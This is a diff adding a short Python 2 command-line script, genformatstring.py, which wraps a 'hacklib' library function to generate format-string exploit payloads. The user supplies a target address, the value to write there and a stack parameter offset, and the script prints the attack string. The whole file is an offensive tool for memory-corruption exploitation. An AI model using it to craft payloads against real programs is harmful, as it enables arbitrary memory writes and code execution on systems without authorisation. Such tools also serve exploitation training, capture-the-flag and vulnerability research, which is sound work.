@@ -1,0 +1,35 @@
+#!/usr/bin/python
+#
+# Syntax:
+#   genformatstring.py [--inline] <4byte-overwrite-address> <withaddress> [ptroffset]
+#          --inline allows input from STDIN to preceed the format string
+#	   ptroffset is the parameter number to access (eg 4)
+
+import sys
+from atlasutils.hacklib import genformatstring
+
+inline = False
+
+
+
+if (len(sys.argv) < 2):
+  print >>sys.stderr, "Syntax:\n 	./genformatstring.py [--inline] <4byte-overwritten-address> <withaddress>"
+  print >>sys.stderr, " 		--inline allows input from STDIN to preceed the format string"
+  print >>sys.stderr, " 		ptroffset is the parameter number to access (eg 4)\n\n"
+  sys.exit(1);
+
+
+if (sys.argv[1] == "--inline"):
+  sys.argv.pop(1)
+  inline = True
+
+overwriteaddress = int(sys.argv[1],16)
+withaddress = int(sys.argv[2],16)
+if (len(sys.argv) > 3): 
+  ptroffset = int(sys.argv[3])
+else: 
+  ptroffset = 4
+
+print >>sys.stderr, "%08x : %08x" % (overwriteaddress, withaddress)
+
+sys.stdout.write( genformatstring(overwriteaddress,withaddress,ptroffset,None,inline))
